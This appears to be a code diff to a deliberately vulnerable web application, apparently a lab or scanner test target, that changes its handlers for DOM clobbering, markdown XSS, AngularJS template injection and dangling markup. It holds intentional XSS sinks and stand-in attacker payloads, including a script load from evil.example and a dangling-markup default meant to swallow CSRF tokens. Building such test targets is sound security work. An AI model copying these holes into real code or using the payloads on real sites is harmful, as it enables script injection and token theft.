@@ -38,15 +38,41 @@ def xss_postmessage(handler, params: Dict[str, str], *, head_only: bool = False)
     tags=["active", "browser"],
 )
 def xss_dom_clobber(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
-    # Reflect unsanitized HTML allowing <a id=defaultConfig href=...>
-    raw = params.get("html", '<a id="defaultConfig" href="cid:evil&quot;onerror=alert(1)//">x</a>')
+    # Reflect unsanitized HTML so attackers can inject <a id=defaultConfig href=…>
+    # or <form id=defaultConfig><input name=url value=…>. Shorthand ?href=/ ?url=
+    # builds a clobbering anchor when html= is omitted.
+    if "html" in params:
+        raw = params.get("html") or ""
+    else:
+        href = params.get("href") or params.get("url") or "https://evil.example/clobber.js"
+        raw = f'<a id="defaultConfig" href="{href}">x</a>'
     body = page(
         "DOM clobber",
         f"<div id='sink'>{raw}</div>"
+        "<p id='retained'></p>"
+        "<p id='status'></p>"
         "<script>"
-        "var cfg = window.defaultConfig || {url:'/safe'};"
-        "document.write('<p>cfg.url='+cfg+ '</p>');"
-        "</script>",
+        "(function(){"
+        "  var cfg = window.defaultConfig || {url:'/safe', href:'/safe'};"
+        "  var resolved = '';"
+        "  if (cfg && typeof cfg === 'object') {"
+        "    if (typeof cfg.href === 'string' && cfg.href) resolved = cfg.href;"
+        "    else if (typeof cfg.url === 'string' && cfg.url) resolved = cfg.url;"
+        "    else if (cfg.url && typeof cfg.url.value === 'string') resolved = cfg.url.value;"
+        "    else if (cfg.href && typeof cfg.href.value === 'string') resolved = cfg.href.value;"
+        "  }"
+        "  if (!resolved) resolved = String(cfg);"
+        "  document.getElementById('retained').textContent = 'cfg.url=' + resolved;"
+        "  // Vulnerable sink: treat clobbered config as a script URL (DOM clobber → XSS)."
+        "  var s = document.createElement('script');"
+        "  s.src = resolved;"
+        "  s.onload = function(){ document.getElementById('status').textContent = 'script-load-ok'; };"
+        "  s.onerror = function(){ document.getElementById('status').textContent = 'script-load-attempted'; };"
+        "  document.body.appendChild(s);"
+        "})();"
+        "</script>"
+        "<p>Inject via <code>?html=&lt;a id=defaultConfig href=…&gt;</code> "
+        "or <code>?href=https://…</code> — value is retained in <code>#retained</code>.</p>",
     )
     send(handler, 200, body, head_only=head_only)
 
@@ -95,18 +121,19 @@ def tabnabbing(handler, params: Dict[str, str], *, head_only: bool = False) -> N
 )
 def xss_markdown(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
     md = params.get("md", "[xss](javascript:alert(1))")
-    # Toy markdown: links + raw HTML passthrough
+    # Toy markdown: links + raw HTML passthrough.
+    # Allow ')' inside URLs (javascript:alert(1)) by matching until the final ')'.
     import re
 
-    html_out = html.escape(md)
-    html_out = re.sub(
-        r"\[([^\]]+)\]\(([^)]+)\)",
-        lambda m: f'<a href="{m.group(2)}">{m.group(1)}</a>',
-        md,
-    )
-    html_out = html_out.replace("&lt;script&gt;", "<script>").replace("&lt;/script&gt;", "</script>")
     if "<" in md and "script" in md.lower():
         html_out = md  # raw HTML allowed
+    else:
+        def _link(m: re.Match) -> str:
+            return f'<a href="{m.group(2)}">{html.escape(m.group(1))}</a>'
+
+        html_out = re.sub(r"\[([^\]]+)\]\((.+)\)", _link, md)
+        if html_out == md and "[" not in md:
+            html_out = html.escape(md)
     body = page("Markdown XSS", f"<div class='md'>{html_out}</div>")
     send(handler, 200, body, head_only=head_only)
 
@@ -120,10 +147,11 @@ def xss_markdown(handler, params: Dict[str, str], *, head_only: bool = False) ->
 )
 def xss_angular(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
     q = params.get("q", "{{7*7}}")
+    # Local angular-lite avoids CDN dependency while still evaluating {{expr}}.
     body = page(
         "AngularJS SSTI-ish",
-        "<div ng-app><p>Search: " + q + "</p></div>"
-        "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js'></script>",
+        "<div ng-app><p>Search: <span ng-bind>" + q + "</span></p></div>"
+        "<script src='/static/angular-lite.js'></script>",
         extra_head="",
     )
     send(handler, 200, body, head_only=head_only)
@@ -137,7 +165,8 @@ def xss_angular(handler, params: Dict[str, str], *, head_only: bool = False) -> 
     tags=["active"],
 )
 def xss_dangling(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
-    q = params.get("q", '<img src="https://evil.example/x?')
+    # Default uses a single-quoted open attribute so following markup (csrf) is swallowed.
+    q = params.get("q", "<img src='https://evil.example/x?")
     body = page(
         "Dangling markup",
         f"<p>Result: {q}</p>"
